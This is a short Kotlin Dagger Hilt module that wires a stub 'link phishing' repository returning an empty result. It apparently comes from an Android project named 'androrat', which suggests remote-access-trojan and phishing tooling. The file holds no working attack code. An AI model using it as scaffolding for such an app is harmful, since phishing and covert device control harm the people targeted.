package com.ierusalem.androrat.features.link_phishing.di

import com.ierusalem.androrat.features.link_phishing.data.LinkPhishingRepository
import com.ierusalem.androrat.features.link_phishing.data.model.EventsModel
import dagger.Module
import dagger.Provides
import dagger.hilt.InstallIn
import dagger.hilt.components.SingletonComponent
import retrofit2.Response
import javax.inject.Singleton

@Module
@InstallIn(SingletonComponent::class)
object LinkPhishingModule {

    @Provides
    @Singleton
    fun provideLinkPhishingRepository(): LinkPhishingRepository {
        return object : LinkPhishingRepository {
            override suspend fun getLinkedDevices(): Response<EventsModel> {
                return Response.success(EventsModel())
            }
        }
    }
}
